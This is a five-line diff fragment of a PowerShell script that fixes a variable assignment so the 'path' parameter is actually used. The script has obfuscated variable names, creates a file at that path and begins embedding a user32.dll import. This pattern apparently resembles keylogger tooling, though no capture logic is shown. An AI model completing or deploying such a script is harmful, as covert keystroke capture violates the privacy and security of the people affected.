@@ -1,5 +1,5 @@
 param($path)
-$KDIpAEtgq2 = path; 
+$KDIpAEtgq2 = $path; 
 if ((Test-Path $KDIpAEtgq2) -eq $false) {New-Item $KDIpAEtgq2}
     $DNVicaO1rPfw0tg8FZzQ = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
